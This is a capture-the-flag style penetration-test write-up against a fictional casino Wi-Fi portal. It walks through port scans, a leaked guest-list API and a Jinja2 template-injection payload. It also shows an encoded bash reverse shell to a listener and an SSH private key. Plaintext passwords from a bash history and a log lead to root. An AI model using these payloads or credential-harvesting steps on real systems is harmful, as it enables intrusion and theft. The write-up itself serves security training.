# Objective and scope
Las Vegas is gearing up for a massive cybersecurity conference, and you've been hired to conduct a penetration test against one of the casinos. The client - Hack Smarter World - is a luxury resort where many of the attendees will be staying. Your objective is to identify all vulnerabilities and elevate your privileges to root (if possible).

You have been provided the IP of the Wifi Captive Portal... but no other information.

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT 10.0.16.132      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-21 16:29 +0100
Nmap scan report for 10.0.16.132
Host is up (0.095s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 35.04 seconds
```

## Nmap
```python
nmap -p 22,80,2222 -A --min-rate=2000 -sT 10.0.16.132          
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-21 16:31 +0100
Nmap scan report for 10.0.16.132
Host is up (0.095s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 50:b1:7c:7a:d5:3b:c0:83:a8:c7:37:7b:21:b3:b5:9e (ECDSA)
|_  256 cb:8e:b7:cc:bd:a8:2c:5a:e5:c4:cb:8c:60:d3:d3:d3 (ED25519)
80/tcp   open  http    Werkzeug httpd 3.1.8 (Python 3.10.18)
|_http-server-header: Werkzeug/3.1.8 Python/3.10.18
| http-title: Hack Smarter World - Guest WiFi & Portal
|_Requested resource was /login
2222/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u7 (protocol 2.0)
| ssh-hostkey: 
|   3072 7d:c5:f5:ba:03:3e:f0:76:5c:9d:47:b6:39:b5:c7:a4 (RSA)
|   256 ed:5d:fa:ea:74:a0:56:b1:39:59:fc:c5:22:1e:5e:bd (ECDSA)
|_  256 50:31:d9:54:80:42:b8:44:cb:40:66:ea:cf:8f:cf:37 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 (96%), HP P2000 G3 NAS device (93%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 - 5.14 (93%), Linux 5.14 - 6.8 (93%), Linux 3.2 - 4.14 (93%), Linux 4.15 - 5.19 (93%), Linux 2.6.32 - 3.10 (92%), Linux 5.4 - 5.15 (92%), Linux 3.10 - 4.11 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ill create an entry in `/etc/hosts` for `casino.hsm` since it doesnt look like there is one setup
# SSH (22)
## Auth method
```python
ssh root@10.0.16.132                  
The authenticity of host '10.0.16.132 (10.0.16.132)' can't be established.
ED25519 key fingerprint is: SHA256:xNA8ct5SST3a/v1BCwF46Mf9QnDdLMnEET/t37F26gU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.16.132' (ED25519) to the list of known hosts.
root@10.0.16.132: Permission denied (publickey).
```

Key based authentication

# SSH (2222)
## Auth method
```python
ssh root@10.0.16.132 -p 2222
The authenticity of host '[10.0.16.132]:2222 ([10.0.16.132]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:TF+GAFGmxDZ9jQQKJMaZoJ/D+UdsPgR9P2sa6YiJswM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.0.16.132]:2222' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
root@10.0.16.132's password:
```

This i assume is a docker container, this does allow password based auth

# HTTP (80)

![487](Pasted%20image%2020260821164006.png)

So it looks like its taking a last name and a room number, could be vulnerable to a brute force

![](Pasted%20image%2020260821163940.png)

The application is running on flask

There are no subdomains 

## Feroxbuster
```python
feroxbuster -u http://casino.hsm/ -C 404 --dont-filter

302      GET        5l       22w      199c http://casino.hsm/ => http://casino.hsm/login
302      GET        5l       22w      199c http://casino.hsm/logout => http://casino.hsm/login
200      GET       39l       84w      788c http://casino.hsm/static/css/style.css
200      GET       99l      351w     4778c http://casino.hsm/login
200      GET        2l        9w      171c http://casino.hsm/static/js/app.min.js
302      GET        5l       22w      199c http://casino.hsm/profile => http://casino.hsm/login
302      GET        5l       22w      199c http://casino.hsm/dashboard => http://casino.hsm/login
```

Nothing too interesting

Ill have a look at the javascript file

![](Pasted%20image%2020260821164803.png)

Another reference to a another file ill have a look at

Browsing to `app.min.js.map` downloads a file

```python
cat app.min.js.map                        
{ 
	"version": 3, 
	"file": "app.min.js", 
	"sources": ["src/api/roomVerification.js"], 
	"sourcesContent": [ 
		"// Front-Desk Kiosk API verification helper\nasync function checkRoomStatus(roomNum) {\n const res = await fetch('/api/v1/rooms/status?status=occupied');\n return await res.json();\n}"
  ]
}
```

Looks like there is a request to an API

Ill try curling it and seeing the output

After curling it gives a large JSON response ill use jq to format it nicely

```python
curl http://casino.hsm/api/v1/rooms/status?status=occupied | jq .
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100  11732 100  11732   0      0  40330      0                              0
{
  "filter": "occupied",
  "rooms": [
    {
      "checkout": "2026-08-11",
      "guest_name": "Smith",
      "id": 1,
      "room_number": 105,
      "status": "occupied",
      "tier": "Standard Guest"
    },
    {
      "checkout": "2026-08-23",
      "guest_name": "Johnson",
      "id": 2,
      "room_number": 107,
      "status": "occupied",
      "tier": "Executive Suite"
    },
    {
      "checkout": "2026-08-20",
      "guest_name": "Williams",
      "id": 3,
      "room_number": 108,
      "status": "occupied",
      "tier": "Diamond Club"
    },
    {
      "checkout": "2026-08-26",
      "guest_name": "Brown",
      "id": 4,
      "room_number": 112,
      "status": "occupied",
      "tier": "Standard Guest"
    },
    {
      "checkout": "2026-08-22",
      "guest_name": "Jones",
      "id": 5,
      "room_number": 122,
      "status": "occupied",
      "tier": "VIP Premium"
    },
    {
      "checkout": "2026-08-18",
      "guest_name": "Garcia",
      "id": 6,
      "room_number": 127,
      "status": "occupied",
      "tier": "Standard Guest"
    },
    
...[SNIP]...
```

This endpoint returns all the guests and their room numbers, this info will allow me to login

# Logging into the portal

Im not sure if the login i choose matters, i would guess every guest has the same access

![1043](Pasted%20image%2020260821165503.png)

I am now logged in

![](Pasted%20image%2020260821165708.png)

The only functionality once logged in is in `/profile`

It is vulnerable to SSTI, specifically jinja2 which makes sense since its a python web app

> The reason i wanted to test for this, was simply becuase it was reflecting the preferred display name back to the user, this is usually done through templating engines

# Server Side Template Injection (SSTI) into a reverse shell

Ill proxy a request and work through the proxy to get RCE

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Ill choose this payload

```python
POST /profile HTTP/1.1
Host: casino.hsm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: http://casino.hsm
Connection: keep-alive
Referer: http://casino.hsm/profile
Cookie: session=.eJxFjk0KgzAQha8is1HBigotxQsUuvUAIZqoQ_MjybgoIXdvtJSu5nsfD94EEOg3xd_McC2hhxAyL9VcM4YGibEEi7IjV_7kcUdFaL4B9WZd6hS59XlZb3aTpshRJHaSi6LMYoQKll16gj7AtMrpZXdigtOx1TXd7dLcL22bWjM6T78vnun4JBX_u0Ejrck5azUzux6lg75trhUQHggDcSO4E9njHIzxAxZmSoI.aoh2RQ.bH4Jm8yeYaZ1azxbMpLL0GZeckA
Upgrade-Insecure-Requests: 1
Priority: u=0, i

display_name=%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()%20%7D%7D
```

Ill use this request and send it to the server with some URL encoding on the payload

![](Pasted%20image%2020260821170338.png)

As seen here i now have remote code execution

I will now adapt this to get a reverse shell

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.200.83.255
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Ill start a listener

![](Pasted%20image%2020260821171824.png)

Ill grab a payload from revshells 

```python
POST /profile HTTP/1.1
Host: casino.hsm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: http://casino.hsm
Connection: keep-alive
Referer: http://casino.hsm/profile
Cookie: session=.eJxFjk0KgzAQha8is1HBigotxQsUuvUAIZqoQ_MjybgoIXdvtJSu5nsfD94EEOg3xd_McC2hhxAyL9VcM4YGibEEi7IjV_7kcUdFaL4B9WZd6hS59XlZb3aTpshRJHaSi6LMYoQKll16gj7AtMrpZXdigtOx1TXd7dLcL22bWjM6T78vnun4JBX_u0Ejrck5azUzux6lg75trhUQHggDcSO4E9njHIzxAxZmSoI.aoh2RQ.bH4Jm8yeYaZ1azxbMpLL0GZeckA
Upgrade-Insecure-Requests: 1
Priority: u=0, i

display_name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMDAuODMuMjU1LzEzMzcgMD4mMQ== | base64 -d | bash').read() }}
```

Ill put the base64 encoded payload in, then base64 decode it then run it with bash

Ill URL encode the full string and send the request

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.200.83.255
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => a979c559ed66 10.0.16.132 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
[+] Upgrading shell to PTY...
[+] PTY upgrade successful via /usr/local/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/a979c559ed66~10.0.16.132-Linux-x86_64/2026_08_21-17_21_55-457.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
bash: /root/.bashrc: Permission denied
www-data@a979c559ed66:/app/app$ ls -al
total 80
drwxrwxrwx 1 www-data www-data  4096 Aug 11 04:14 .
drwxrwxrwx 1 www-data www-data  4096 Aug 11 04:46 ..
drwxrwxr-x 1 www-data www-data  4096 Aug 21 15:28 __pycache__
-rw-rw-r-- 1 www-data www-data  4639 Aug 11 04:14 app.py
-rw-rw-r-- 1 www-data www-data  4300 Aug  9 22:30 database.py
-rw-rw-rw- 1 www-data www-data 24576 Aug  9 22:30 resort.db
drwxrwxr-x 1 www-data www-data  4096 Aug 11 03:28 static
drwxrwxr-x 1 www-data www-data  4096 Aug 11 03:28 templates
www-data@a979c559ed66:/app/app$ whoami
www-data
www-data@a979c559ed66:/app/app$
```

I now have a reverse shell

Looks like its put me into the docker container looking at the hostname

```python
www-data@a979c559ed66:/app/app$ ls -al /home/
total 16
drwxr-xr-x 1 root   root   4096 Aug 21 15:28 .
drwxr-xr-x 1 root   root   4096 Aug 21 15:28 ..
drwxr-xr-x 2 david  david  4096 Aug 21 15:28 david
drwxr-xr-x 3 george george 4096 Aug 21 15:28 george
www-data@a979c559ed66:/app/app$
```

There are two users on the container

```python
www-data@a979c559ed66:/app/app$ cat /home/george/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAujsQHjwA9wXzNMomKSKONiJAonz88qixj9XOPLt9C+hByv+ovo94
hjCMX60JcZAdSsZlVOPOT3NS2nAV6/fEy7RIMrtcqYiMbcXGOFtFQM0lVrBAffpgy5FX9e
FL1qC5e7upSiG8YMZJEj8DXHsr2MrdyOa9GrviXp8fg5sw78rem7w/toDyERRZnxr/fzYa
HJ1Hr93b/AneQFrfZiiye8Oj8SLSq2FfvI711P1zELARTOir7oMEoDszu5yuH6IbbbrOSE
xfEYPdIEHMJQbCi8KXiF7Og8CFqAw/STMQhYiRje/eNUr83AM1XexDzwlHuZyrADJZBDcE
jwDccz2AhQAAA8i9zqeXvc6nlwAAAAdzc2gtcnNhAAABAQC6OxAePAD3BfM0yiYpIo42Ik
CifPzyqLGP1c48u30L6EHK/6i+j3iGMIxfrQlxkB1KxmVU485Pc1LacBXr98TLtEgyu1yp
iIxtxcY4W0VAzSVWsEB9+mDLkVf14UvWoLl7u6lKIbxgxkkSPwNceyvYyt3I5r0au+Jenx
+DmzDvyt6bvD+2gPIRFFmfGv9/NhocnUev3dv8Cd5AWt9mKLJ7w6PxItKrYV+8jvXU/XMQ
sBFM6KvugwSgOzO7nK4fohttus5ITF8Rg90gQcwlBsKLwpeIXs6DwIWoDD9JMxCFiJGN79
41SvzcAzVd7EPPCUe5nKsAMlkENwSPANxzPYCFAAAAAwEAAQAAAQBmtQw+oHknw3BOPO6u
4Q/taxaahrQ6YC8NVK1ZcU2Vs5IVkspNznJ6D2xbl+MNbp25D5HzL3ApAUFAl3B/ozY14k
evMwX3ugc4w0p+6ldXVcyx8qKe1+dqXc5VHNvmkt25D9ZdvB1YggLqvTXtW0DjX37Rve+t
PtGpvbhzrLNgi2E6yPsu1pIcsaK4uKPXT+J7uHOstZvFiqMYrIdHNsIG5CQ7GrfqXo6mao
OEzuh+blDKMcBJwBw0bYjH4ZRwjYb2Uyn4w6joVb/ziRv8XfPzEh953eViRWITapRFq7iV
XaxPkQZT25HpS16rjBTmKlzUX+EGj1jGKW13TrvKpGJBAAAAgEXwjPT7kBUQwH73R0Eq00
ZPgiNAT/onwA2ZLkpnyLMjHqB4rbZEvroLpSWyx62ne2bylmjTFWoEcaLQTBTtWI5SUOrU
6elGdbJC+3jK3s1V8K4vXgJ24kl6feyLcc3eoqO2GARsty/uRwEqLAkcw8KsqyxVtUHOJ3
NjnJMjcC7HAAAAgQDd20kw+iIXXmFw1IGqTiv2mg+HsQnOXZAXNqcp/ejRjmEALkODXi64
mH2PB3h1XA7XncKYeXihqCnbC46bRFj92yE6ZLE7LUpS/r0X4/mILnIqF/r9DVJbJg63WO
w7te0cKcnv1RsjihAez5YIh8182BuVby0A7KlkmzA/f70JLwAAAIEA1uQwCl/FogM++4eo
M9/fdZaI4Z3Bv3WiLFOXmr/c/oWJUWExrN8dK7H/pxAGFjPYTnnBQZyzibGf0Kj0mgmfE1
iej9aXKXkHgTnRp6LkxNb7TYKKWpWEr9QPm8TCmA+0YMkjn3ehsvtjkBqrcsqU9SjsBjja
DxJwIn87HbwVvIsAAAARcm9vdEBhOTc5YzU1OWVkNjYBAg==
-----END OPENSSH PRIVATE KEY-----
www-data@a979c559ed66:/app/app$
```

I have found a private key for SSH in georges home directory

# SSH access

```python
nano id_rsa

chmod 600 id_rsa 
```

Ill put the key into a file and change the perms

```python
ssh george@casino.hsm -p 2222 -i id_rsa 
The authenticity of host '[casino.hsm]:2222 ([10.0.16.132]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:TF+GAFGmxDZ9jQQKJMaZoJ/D+UdsPgR9P2sa6YiJswM
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:26: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[casino.hsm]:2222' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux a979c559ed66 7.0.0-1010-aws #10~24.04.1-Ubuntu SMP PREEMPT Mon Jul 27 17:41:33 UTC 2026 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
george@a979c559ed66:~$
```

This gets me access as `george` on the docker container

# Access as `david`

```python
george@a979c559ed66:~$ cat .bash_history 
cd /var/www/app
ls -la
systemctl status gunicorn
python3 -m pip install -r requirements.txt
tail -f /var/log/syslog
cat /etc/netplan/01-netcfg.yaml
uptime
htop
ifconfig
netstat -tulpn
cd /etc/ssh/
cat sshd_config | grep -v '^#'
cd /home/george
ls -la
ssh-keygen -t rsa -b 2048
cat .ssh/id_rsa.pub >> .ssh/authorized_keys
chmod 644 .ssh/id_rsa
sudo systemctl restart ssh
w
whoami
df -h
free -m
su david
DavidPass2026!#
exit
history -c
mysql -u david -p'DavidPass2026!#' -h 127.0.0.1 resort_db
cd /opt/
ls -la
cat /var/log/provisioning.log
echo "Restarting service..."
python3 app.py
ps aux | grep python
curl http://127.0.0.1/api/v1/rooms/status
curl http://127.0.0.1/login
clear
date
ping -c 4 8.8.8.8
dig hacksmarter.sec
cat /etc/hosts
sudo ufw status
traceroute 10.40.0.1
cd ~
ls -la
exit
```

Checking the bash history of george i see a password

```python
eorge@a979c559ed66:~$ su david
Password: 
david@a979c559ed66:/home/george$
```

The password works on david

david is in the adm group which means i can read logs

# Root access

```python
avid@a979c559ed66:/var/log$ cat provisioning.log 
2026-08-01 03:14:02 [INFO] Starting automated cluster provisioning for Hack Smarter World host node...
2026-08-01 03:14:15 [INFO] Configuring network interfaces eth0 (VLAN 402)...
2026-08-01 03:14:22 [INFO] Initializing MariaDB production instance...
2026-08-01 03:14:28 [INFO] Seeding resort guest database tables...
2026-08-01 03:14:30 [SUCCESS] Applied security policy for root access.
2026-08-01 03:14:31 [DEBUG] Saved system root sync credential: R3s0rt_Sup3r_S3cr3t_R00t_2026!
2026-08-01 03:14:35 [INFO] Generating SSH host key certificates...
2026-08-01 03:14:45 [INFO] Deployment completed successfully.
david@a979c559ed66:/var/log$
```

Since i can read logs, ill go through the log files and i see a password

```python
george@a979c559ed66:~$ su root
Password: 
root@a979c559ed66:/home/george# 
root@a979c559ed66:/home/george# 
root@a979c559ed66:/home/george# 
root@a979c559ed66:/home/george# 
root@a979c559ed66:/home/george# 
```